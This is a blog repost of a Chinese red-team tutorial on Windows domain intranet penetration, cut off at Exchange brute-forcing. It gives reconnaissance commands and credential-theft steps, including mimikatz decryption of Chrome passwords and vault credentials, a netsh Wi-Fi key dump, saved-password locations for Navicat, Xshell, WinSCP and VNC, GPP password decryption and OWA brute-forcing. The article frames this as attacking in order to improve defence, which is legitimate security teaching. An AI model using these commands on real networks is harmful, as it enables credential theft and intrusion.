<!DOCTYPE HTML>
<html lang="en">


<head>
    <meta charset="utf-8">
    <meta name="keywords" content="红蓝对抗之Windows内网渗透, citytwilight">
    <meta name="description" content="">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <!-- Global site tag (gtag.js) - Google Analytics -->


    <title>红蓝对抗之Windows内网渗透 | citytwilight</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">

    <script src="/libs/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 5.4.0"></head>




<body>
    <header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
                    
                    <span class="logo-span">citytwilight</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
<ul class="right nav-menu">
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/" class="waves-effect waves-light">
      
      <i class="fas fa-home" style="zoom: 0.6;"></i>
      
      <span>Index</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/tags" class="waves-effect waves-light">
      
      <i class="fas fa-tags" style="zoom: 0.6;"></i>
      
      <span>Tags</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/categories" class="waves-effect waves-light">
      
      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
      
      <span>Categories</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/archives" class="waves-effect waves-light">
      
      <i class="fas fa-archive" style="zoom: 0.6;"></i>
      
      <span>Archives</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/about" class="waves-effect waves-light">
      
      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
      
      <span>About</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/contact" class="waves-effect waves-light">
      
      <i class="fas fa-comments" style="zoom: 0.6;"></i>
      
      <span>Contact</span>
    </a>
    
  </li>
  
  <li class="hide-on-med-and-down nav-item">
    
    <a href="/friends" class="waves-effect waves-light">
      
      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
      
      <span>Friends</span>
    </a>
    
  </li>
  
  <li>
    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
    </a>
  </li>
</ul>


<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <img src="/medias/logo.png" class="logo-img circle responsive-img">
        
        <div class="logo-name">citytwilight</div>
        <div class="logo-desc">
            
            Never really desperate, only the lost of the soul.
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li class="m-nav-item">
	  
		<a href="/" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-home"></i>
			
			Index
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/tags" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-tags"></i>
			
			Tags
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/categories" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-bookmark"></i>
			
			Categories
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/archives" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-archive"></i>
			
			Archives
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/about" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-user-circle"></i>
			
			About
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/contact" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-comments"></i>
			
			Contact
		</a>
          
        </li>
        
        <li class="m-nav-item">
	  
		<a href="/friends" class="waves-effect waves-light">
			
			    <i class="fa-fw fas fa-address-book"></i>
			
			Friends
		</a>
          
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
                <i class="fab fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>


        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>

    



<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/11.jpg')">
    <div class="container" style="right: 0px;left: 0px;">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <h1 class="description center-align post-title">红蓝对抗之Windows内网渗透</h1>
                </div>
            </div>
        </div>
    </div>
</div>




<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        width: 345px;
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        padding: 35px 0 15px 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content {
        padding-bottom: 30px;
        overflow: auto;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;

        position: absolute;
        right: 23.5vw;
        display: block;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 15px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
                                <span class="chip bg-color">内网渗透</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fas fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="post-category">
                                渗透测试
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                
                <div class="post-date info-break-policy">
                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
                    2022-10-31
                </div>
                

                

                

                

                
            </div>
        </div>
        <hr class="clearfix">

        
        <!-- 是否加载使用自带的 prismjs. -->
        <link rel="stylesheet" href="/libs/prism/prism.css">
        

        

        <div class="card-content article-card-content">
            <div id="articleContent">
                <h1 id="红蓝对抗之Windows内网渗透"><a href="#红蓝对抗之Windows内网渗透" class="headerlink" title="红蓝对抗之Windows内网渗透"></a>红蓝对抗之Windows内网渗透</h1><pre class="line-numbers language-none"><code class="language-none">作者 :jumbo@腾讯蓝军
原文链接：https:&#x2F;&#x2F;security.tencent.com&#x2F;index.php&#x2F;blog&#x2F;msg&#x2F;154<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><strong>前言</strong></p>
<p>无论是渗透测试，还是红蓝对抗，目的都是暴露风险，促进提升安全水平。企业往往在外网布置重兵把守，而内网防护相对来说千疮百孔，所以渗透高手往往通过攻击员工电脑、外网服务、职场WiFi等方式进入内网，然后发起内网渗透。而国内外红蓝对抗服务和开源攻击工具大多数以攻击Windows域为主，主要原因是域控拥有上帝能力，可以控制域内所有员工电脑，进而利用员工的合法权限获取目标权限和数据，达成渗透目的。</p>
<p>本文以蓝军攻击视角，介绍常用的Windows内网渗透的手法，包括信息收集、传输通道、权限提升、密码获取、横向移动、权限维持、免杀处理，主要让大家了解内网渗透到手法和危害，以攻促防，希望能给安全建设带来帮助。</p>
<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>在攻陷一台机器后，不要一味的直接去抓取机器密码、去做一些扫描内网的操作，因为如果网内有IDS等安全设备，有可能会造成报警，丢失权限。本节主要介绍当一台内网机器被攻破后，我们收集信息的一些手法。</p>
<h2 id="1-1-SPN"><a href="#1-1-SPN" class="headerlink" title="1.1 SPN"></a>1.1 SPN</h2><p>SPN：服务主体名称。使用Kerberos须为服务器注册SPN，因此可以在内网中扫描SPN，快速寻找内网中注册的服务，SPN扫描可以规避像端口扫描的不确定性探测动作。主要利用工具有：setspn、GetUserSPNs.vbs和Rubeus。</p>
<p>a、利用Windows自带的setspn工具，普通域用户权限执行即可：</p>
<pre class="line-numbers language-none"><code class="language-none">setspn -T domain.com -Q &#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202210311730481.png"></p>
<p>在上述截图中可以清晰的看到DCServer机器上运行了dns服务。如果网内存在mssql，利用SPN扫描也可以得到相应的结果。</p>
<p>b、利用GetUserSPNs.vbs也可以获取spn结果:</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202210311730949.png"></p>
<p>c、Rubeus工具是Harmj0y开发用于测试Kerberos的利用工具。</p>
<p>如下图利用Rubeus查看哪些域用户注册了SPN，也为后续Kerberoasting做准备：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202210311731113.png"></p>
<h2 id="1-2-端口连接"><a href="#1-2-端口连接" class="headerlink" title="1.2 端口连接"></a>1.2 端口连接</h2><p>利用netstat<br> -ano命令获取机器通信信息，根据通信的端口、ip可以获取到如下信息。如果通信信息是入流量，则可以获取到跳板机/堡垒机、管理员的PC来源IP、本地web应用端口等信息；如果通信信息是出流量，则可以获取到敏感端口（redis、mysql、mssql等）、API端口等信息。</p>
<h2 id="1-3-配置文件"><a href="#1-3-配置文件" class="headerlink" title="1.3 配置文件"></a>1.3 配置文件</h2><p>一个正常的Web应用肯定有对应的数据库账号密码信息，是一个不错的宝藏。</p>
<p>可以使用如下命令寻找包含密码字段的文件：</p>
<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;web findstr &#x2F;s &#x2F;m “password” .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>下面是常用应用的默认配置路径：</p>
<p>a、</p>
<pre class="line-numbers language-none"><code class="language-none">Tomcat: CATALINA_HOME&#x2F;conf&#x2F;tomcat-users.xml<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>b、</p>
<pre class="line-numbers language-none"><code class="language-none">Apache: &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>c、</p>
<pre class="line-numbers language-none"><code class="language-none">Nginx: &#x2F;etc&#x2F;nginx&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>d、</p>
<pre class="line-numbers language-none"><code class="language-none">Wdcp: &#x2F;www&#x2F;wdlinux&#x2F;wdcp&#x2F;conf&#x2F;mrpw.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>e、</p>
<pre class="line-numbers language-none"><code class="language-none">Mysql: mysql\data\mysql\user.MYD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="1-4-用户信息"><a href="#1-4-用户信息" class="headerlink" title="1.4 用户信息"></a>1.4 用户信息</h2><p>可以在网内收集用户等信息，对高权限用户做针对性的攻击，包括定位到域控，对域控发起攻击。</p>
<p>a、查看域用户，普通域用户权限即可：</p>
<pre class="line-numbers language-none"><code class="language-none">net user &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010911350.png"></p>
<p>b、查看域管理员：</p>
<pre class="line-numbers language-none"><code class="language-none">net group “domain admins” &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010908199.png"></p>
<p>c、快速定位域控ip，一般是dns、时间服务器：</p>
<pre class="line-numbers language-none"><code class="language-none">net time &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010909325.png"></p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010912834.png"></p>
<pre class="line-numbers language-none"><code class="language-none">nslookup -type&#x3D;all _ldap._tcp.dc._msdcs.jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010915822.png"></p>
<p>d、查看域控制器：</p>
<pre class="line-numbers language-none"><code class="language-none">net group “domain controllers” &#x2F;domain<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010915847.png"></p>
<h2 id="1-5-内网主机发现"><a href="#1-5-内网主机发现" class="headerlink" title="1.5 内网主机发现"></a>1.5 内网主机发现</h2><p>可以使用如下命令来达到内网主机的发现。</p>
<p>a、查看共享资料：</p>
<pre class="line-numbers language-none"><code class="language-none">net view<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>b、查看arp表：</p>
<pre class="line-numbers language-none"><code class="language-none">arp -a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>c、查看hosts文件：</p>
<pre class="line-numbers language-none"><code class="language-none">linux: cat &#x2F;etc&#x2F;hosts
    
windows: type c:\Windows\system32\drivers\etc\hosts<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>d、查看dns缓存：</p>
<pre class="line-numbers language-none"><code class="language-none">ipconfig &#x2F;displaydns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010916970.png"></p>
<p>e、当然，利用一些工具也可以，比如nmap、nbtscan：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010916301.png"></p>
<h2 id="1-6-会话收集"><a href="#1-6-会话收集" class="headerlink" title="1.6 会话收集"></a>1.6 会话收集</h2><p>在网内收集会话，如看管理员登录过哪些机器、机器被谁登录过，这样攻击的目标就会清晰很多。</p>
<p>可以使用NetSessionEnum api来查看其他主机上有哪些用户登录。</p>
<p>api相关介绍如下：</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum">https://docs.microsoft.com/en-us/windows/win32/api/lmshare/nf-lmshare-netsessionenum</a></p>
<p>利用powershell脚本PowerView为例。</p>
<p>a、可以查看域用户登录过哪些机器:</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010918771.png"></p>
<p>b、也可以查看机器被哪些用户登陆过：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010918432.png"></p>
<p>其他工具、api类似。当有了上述信息后，就可以对发现到的域管或者登录着域管的机器进行攻击，只要能拿下这些机器，就可以有相应的权限去登录域控。</p>
<h2 id="1-7-凭据收集"><a href="#1-7-凭据收集" class="headerlink" title="1.7 凭据收集"></a>1.7 凭据收集</h2><p>拿下一台机器后，需要尽可能的收集信息。如下是几个常用软件保存密码的注册表地址，可以根据算法去解密保存的账号密码。</p>
<p>比如远程连接凭据:</p>
<p>cmdkey /list</p>
<p>navicat：</p>
<pre class="line-numbers language-none"><code class="language-none">MySQL HKEY_CURRENT_USER\Software\PremiumSoft\Navicat\Servers\

MariaDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMARIADB\Servers\

MongoDB HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMONGODB\Servers\

Microsoft SQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatMSSQL\Servers\

Oracle HKEY_CURRENT_USER\Software\PremiumSoft\NavicatOra\Servers\

PostgreSQL HKEY_CURRENT_USER\Software\PremiumSoft\NavicatPG\Servers\

SQLite HKEY_CURRENT_USER\Software\PremiumSoft\NavicatSQLite\Servers\<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>SecureCRT：</p>
<p>xp/win2003</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Documents and Settings\USERNAME\Application Data\VanDyke\Config\Sessions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>win7/win2008以上</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Users\USERNAME\AppData\Roaming\VanDyke\Config\Sessions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Xshell：</p>
<p>Xshell 5</p>
<pre class="line-numbers language-none"><code class="language-none">%userprofile%\Documents\NetSarang\Xshell\Sessions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>Xshell 6</p>
<pre class="line-numbers language-none"><code class="language-none">%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>WinSCP：</p>
<pre class="line-numbers language-none"><code class="language-none">HKCU\Software\Martin Prikryl\WinSCP 2\Sessions<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>VNC:</p>
<p>RealVNC</p>
<pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\vncserver Password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>TightVNC</p>
<pre class="line-numbers language-none"><code class="language-none">HKEY_CURRENT_USER\Software\TightVNC\Server Value Password or PasswordViewOnly<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>TigerVNC</p>
<pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_USER\Software\TigerVNC\WinVNC4 Password<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>UltraVNC</p>
<pre class="line-numbers language-none"><code class="language-none">C:\Program Files\UltraVNC\ultravnc.ini passwd or passwd2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="1-8-DPAPI"><a href="#1-8-DPAPI" class="headerlink" title="1.8 DPAPI"></a>1.8 DPAPI</h2><p>DPAPI，由微软从Windows 2000开始发布，称为Data Protection Application Programming<br> Interface（DPAPI）。其分别提供了加密函数CryptProtectData 与解密函数<br> CryptUnprotectData 。</p>
<p>其作用范围包括且不限于：</p>
<p>outlook客户端密码</p>
<p>windows credential凭据</p>
<p>chrome保存的密码凭据</p>
<p>internet explorer密码凭据</p>
<p>DPAPI采用的加密类型为对称加密，存放密钥的文件则被称之为Master Key<br> Files，其路径一般为%APPDATA%\Microsoft\Protect{SID}{GUID}。其中{SID}为用户的安全标识符，{GUID}为主密钥名称。我们可以利用用户的密码/hash或域备份密钥解密主密钥，然后解密被dpapi加密的数据。</p>
<p>相关的介绍如下：</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection">https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection</a></p>
<p>在渗透中，可以利用mimikatz做到自动化的数据解密：</p>
<p>a、解密Chrome密码：</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz dpapi::chrome &#x2F;in:”%localappdata%\Google\Chrome\User Data\Default\Login Data” &#x2F;unprotect<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>b、解密Credential：</p>
<pre class="line-numbers language-none"><code class="language-none">mimikatz vault::cred &#x2F;patch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="1-9-域信任"><a href="#1-9-域信任" class="headerlink" title="1.9 域信任"></a>1.9 域信任</h2><p>信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p>
<p>查看域信任：</p>
<pre class="line-numbers language-none"><code class="language-none">nltest &#x2F;domain_trusts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010919489.png"></p>
<p>上述结果显示child.jumbolab.com和jumbolab.com两个域是双向信任的。</p>
<h2 id="1-10-域传送"><a href="#1-10-域传送" class="headerlink" title="1.10 域传送"></a>1.10 域传送</h2><p>当存在域传送漏洞时，可以获取域名解析记录。当有了解析记录后，也能提高对网络环境的进一步认知，比如www解析的ip段可能在dmz区，mail解析的ip段可能在核心区域等等。</p>
<p>windows：</p>
<pre class="line-numbers language-none"><code class="language-none">nslookup -type&#x3D;ns domain.com nslookup sserver dns.domain.com ls domain.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>linux：</p>
<pre class="line-numbers language-none"><code class="language-none">dig @dns.domain.com axfr domain.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="1-11-DNS记录获取"><a href="#1-11-DNS记录获取" class="headerlink" title="1.11 DNS记录获取"></a>1.11 DNS记录获取</h2><p>在网内收集dns记录，可以快速定位一些机器、网站。常用工具有Dnscmd、PowerView。</p>
<p>a、在windows server上，可以使用Dnscmd工具获取dns记录。</p>
<p>获取dns记录：</p>
<pre class="line-numbers language-none"><code class="language-none">Dnscmd . &#x2F;ZonePrint jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010919328.png"></p>
<pre class="line-numbers language-none"><code class="language-none">Dnscmd . &#x2F;EnumRecords jumbolab.com .<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010920881.png"></p>
<p>b、在非windows server机器上，可以使用PowerView获取。</p>
<pre class="line-numbers language-none"><code class="language-none">import-module PowerView.ps1 Get-DNSRecord -ZoneName jumbolab.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010921104.png"></p>
<h2 id="1-12-WIFI"><a href="#1-12-WIFI" class="headerlink" title="1.12 WIFI"></a>1.12 WIFI</h2><p>通过如下命令获取连接过的wifi密码：</p>
<pre class="line-numbers language-none"><code class="language-none">for &#x2F;f “skip&#x3D;9 tokens&#x3D;1,2 delims&#x3D;:” %i in (‘netsh wlan show profiles’) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key&#x3D;clear<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="1-13-GPP"><a href="#1-13-GPP" class="headerlink" title="1.13 GPP"></a>1.13 GPP</h2><p>当分发组策略时，会在域的SYSVOL目录下生成一个gpp配置的xml文件，如果在配置组策略时填入了密码，则其中会存在加密过的账号密码。这些密码，往往都是管理员的密码。</p>
<p>其中xml中的密码是aes加密的，密钥已被微软公开：</p>
<p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be?redirectedfrom=MSDN</a></p>
<p>可以使用相关脚本进行解密，如：</p>
<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1</a></p>
<p>域用户登录脚本存在目录也会存在敏感文件：</p>
<pre class="line-numbers language-none"><code class="language-none">\domain\Netlogon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h2 id="1-14-Seatbelt"><a href="#1-14-Seatbelt" class="headerlink" title="1.14 Seatbelt"></a>1.14 Seatbelt</h2><p>可以利用Seatbelt工具做一些自动化的信息收集，收集的信息很多，包括不限于google历史记录、用户等等：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010921990.png">    </p>
<p>当有了chrome的访问历史时，就可以知道该用户访问的一些内部站点的域名/IP，可以提高内网资产的摸索效率。</p>
<h2 id="1-15-Bloodhound"><a href="#1-15-Bloodhound" class="headerlink" title="1.15 Bloodhound"></a>1.15 Bloodhound</h2><p>我们可以利用Bloodhound做一些自动化的信息收集，包括用户、计算机、组织架构、最快的攻击途径等。但是自动化也意味着告警，该漏洞做自动化信息收集时，会在内网设备上产生大量的告警，按需使用。</p>
<p>执行：</p>
<pre class="line-numbers language-none"><code class="language-none">SharpHound.exe -c all<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>运行完毕会生成一个zip压缩包，名字类似于20200526201154_BloodHound。</p>
<p>导入Bloodhound后可以做可视化分析：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010921864.png"></p>
<p>比较常用的就是寻找攻击域控的最快途径了：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010922748.png" alt="img">    </p>
<p>如下图，我们知道，如果拿下hand用户后，就可以获取到域控权限：</p>
<p><img src="https://fastly.jsdelivr.net/gh/citytwilight/blog-img/img/202211010922532.png"></p>
<h2 id="1-16-Exchange"><a href="#1-16-Exchange" class="headerlink" title="1.16 Exchange"></a>1.16 Exchange</h2><p>exchange一般都在域内的核心位置上，包括甚至安装在域控服务器上，因此我们需要多多关注exchange的相关漏洞，如果拿下exchange机器，则域控也不远了。</p>
<h3 id="1-16-1-邮箱用户密码爆破"><a href="#1-16-1-邮箱用户密码爆破" class="headerlink" title="1.16.1 邮箱用户密码爆破"></a>1.16.1 邮箱用户密码爆破</h3><p>使用ruler工具对owa接口进行爆破：</p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;ruler —domain targetdomain.com brute —users &#x2F;path&#x2F;to&#x2F;user.txt —passwords &#x2F;path&#x2F;to&#x2F;passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ruler工具会自动搜索owa可以爆破的接口，如：</p>
